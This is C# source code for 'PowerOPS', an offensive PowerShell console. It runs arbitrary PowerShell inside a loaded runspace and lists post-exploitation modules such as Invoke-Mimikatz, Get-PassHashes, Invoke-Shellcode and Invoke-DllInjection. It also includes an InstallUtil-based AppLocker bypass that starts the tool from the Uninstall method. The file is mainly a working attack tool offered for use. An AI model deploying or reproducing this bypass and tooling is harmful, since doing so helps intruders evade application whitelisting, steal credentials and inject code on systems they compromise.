using System;
using System.IO;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.DirectoryServices;
using System.Security.Principal;


namespace PowerOPS
{
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        // @subTee app locker bypass
        public override void Install(System.Collections.IDictionary savedState)
        {
            			
        }

        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();
        }
    }

    class Program
    {
        public static void DisplayBanner(string[] toPrint = null)
        {
            Console.Clear();
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.WriteLine(@"PowerOPS - PowerShell for Offensive Operations"); Console.ResetColor(); Console.WriteLine();
        }

        public static void DisplayModules()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[*] PowerUp\n"); Console.ResetColor();
            Console.Write(" Get-ApplicationHost            Get-UnattendedInstallFiles   Invoke-ServiceDisable          Write-CMDServiceBinary\n");
            Console.Write(" Get-RegAlwaysInstallElevated   Get-Webconfig                Invoke-ServiceEnable           Write-ServiceEXE\n");
            Console.Write(" Get-RegAutoLogon               Invoke-AllChecks             Invoke-ServiceStart            Write-ServiceEXECMD\n");
            Console.Write(" Get-ServiceDetails             Invoke-FindDLLHijack         Invoke-ServiceStop             Get-ServicePerms\n");
            Console.Write(" Get-ServiceEXEPerms            Invoke-FindPathHijack        Invoke-ServiceUserAdd          Write-UserAddMSI\n");
            Console.Write(" Get-ServiceUnquoted            Invoke-ServiceCMD            Restore-ServiceEXE             Write-UserAddServiceBinary\n");

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("\n[*] PowerView"); if (!isDomainJoined()) Console.WriteLine(" - This computer is not part of a Domain! Most of the PowerView functions will not work!"); Console.ResetColor();
            Console.Write("\n Get-HostIP                     Get-NetForest                Get-NetUsers                   Invoke-NetGroupUserAdd\n");
            Console.Write(" Get-LastLoggedOn               Get-NetForestDomains         Get-NetForestTrusts            Invoke-NetUserAdd\n");
            Console.Write(" Get-NetComputers               Get-NetGroup                 Get-UserProperties             Invoke-Netview\n");
            Console.Write(" Get-NetConnections             Get-NetGroups                Invoke-CheckLocalAdminAccess   Invoke-SearchFiles\n");
            Console.Write(" Get-NetCurrentUser             Get-NetLocalGroup            Invoke-CheckWrite              Invoke-ShareFinder\n");
            Console.Write(" Get-NetDomain                  Get-NetLocalGroups           Invoke-CopyFile                Invoke-StealthUserHunter\n");
            Console.Write(" Get-NetDomainControllers       Get-NetLocalServices         Invoke-EnumerateLocalAdmins    Invoke-UserFieldSearch\n");
            Console.Write(" Get-NetDomainTrusts            Get-NetLoggedon              Invoke-FileFinder              Invoke-UserHunter\n");
            Console.Write(" Get-NetFiles                   Get-NetSessions              Invoke-FindLocalAdminAccess    Set-MacAttribute\n");
            Console.Write(" Get-NetFileServers             Get-NetShare                 Invoke-FindVulnSystems         Test-Server\n");
            Console.Write(" Get-NetFileSessions            Get-NetUser                  Invoke-HostEnum\n");

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[*] Nishang\n"); Console.ResetColor();
            Console.Write(" Get-Information                Get-PassHashes               Port-Scan\n");

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[*] PowerSploit\n"); Console.ResetColor();
            Console.Write(" Invoke-DllInjection            Invoke-Mimikatz              Invoke-NinjaCopy               Invoke-ReflectivePEInjection\n");
            Console.Write(" Invoke-Shellcode               Invoke-TokenManipulation     Invoke-WmiCommand\n");

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("\n[*] Others\n"); Console.ResetColor();
            Console.Write(" Auto-GPPPassword               Invoke-PsExec                PowerCat\n");

            Console.ResetColor();

            Console.WriteLine("");
        }

        public static void PSinteract()
        {
            PowerShellExecutor t = new PowerShellExecutor();
            string PSfunction = null;

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("\nAll modules imported. Any valid powershell command entered bellow will be executed.\n\n");
            Console.ResetColor();
                
            do
            {
                Console.Write("PS > ");
                PSfunction = Console.ReadLine();

                if (PSfunction == "exit")
                    return;

                if (PSfunction.IndexOf("Invoke-Mimikatz", StringComparison.OrdinalIgnoreCase) >= 0)
                    if (!IsUserAdministrator())
                        return;
                if (PSfunction.IndexOf("Get-PassHashes", StringComparison.OrdinalIgnoreCase) >= 0)
                    if (!IsUserAdministrator())
                        return;

                if (PSfunction.IndexOf("Invoke-Shellcode", StringComparison.OrdinalIgnoreCase) >= 0)
                    if (!isArch_x86())
                        return;

                try
                {
                    t.ExecuteSynchronously(PSfunction);
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0}", e.Message);
                }
            } while (PSfunction != "exit");
        }

        public static bool isDomainJoined()
        {
            try
            {
                System.DirectoryServices.ActiveDirectory.Domain.GetComputerDomain();
            }
            catch
            {
                return false;
            }
            return true;
        }

        public static bool isArch_x86()
        {
            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            if (Arch == "x86")
                return true;
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\nSorry, this module is only for x86 archs.");
                Console.ResetColor();
                return false;
            }
        }

        public static bool IsUserAdministrator()
        {
            bool isAdmin;
            WindowsIdentity user = null;
            try
            {
                user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException)
            {
                isAdmin = false;
            }
            catch (Exception)
            {
                isAdmin = false;
            }
            finally
            {
                if (user != null)
                    user.Dispose();
            }
            if (isAdmin == false)
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\nSorry, you need Admin privileges to perform this action.");
                Console.ResetColor();
                return false;
            }
            else
                return true;
        }

        public static void cleanUp()
        {
            Console.WriteLine("\nPress any key to continue...\n");
            Console.ReadKey();
            Console.Clear();
        }

        public static void Main()
        {
            Console.Title = "PowerOPS - PowerShell for Offensive Operations";
            Console.SetWindowSize(Math.Min(122, Console.LargestWindowWidth), Math.Min(45, Console.LargestWindowHeight));
            Console.SetBufferSize(Console.BufferWidth, Console.BufferHeight);

            string command = null;
            DisplayBanner();
            Console.WriteLine("Type 'help' to list available options\n");

            do
            {
                Console.Write("\nOPS > ");
                command = Console.ReadLine();

                switch(command)
                {
                    case "help":
                        Console.WriteLine("\nVersion 0.1b - rui@deniable.org\n\n[*] OPTIONS\n");
                        Console.ForegroundColor = ConsoleColor.Green; Console.Write("  help"); Console.ResetColor(); Console.WriteLine("                  Display Help");
                        Console.ForegroundColor = ConsoleColor.Green; Console.Write("  show modules"); Console.ResetColor(); Console.WriteLine("          List All Available Modules And Functions");
                        Console.ForegroundColor = ConsoleColor.Green; Console.Write("  powershell"); Console.ResetColor(); Console.WriteLine("            Enter PowerShell shell");
                        Console.ForegroundColor = ConsoleColor.Green; Console.Write("  exit"); Console.ResetColor(); Console.WriteLine("                  Exit this program");
                        break;
                    case "show modules":
                        DisplayModules();
                        break;
                    case "powershell":
                        PSinteract();
                        break;
                    default:
                        Console.WriteLine("\nCommand not found.");
                        break;
                }
            } while (command != "exit");

            Environment.Exit(0);
        }

    }
}
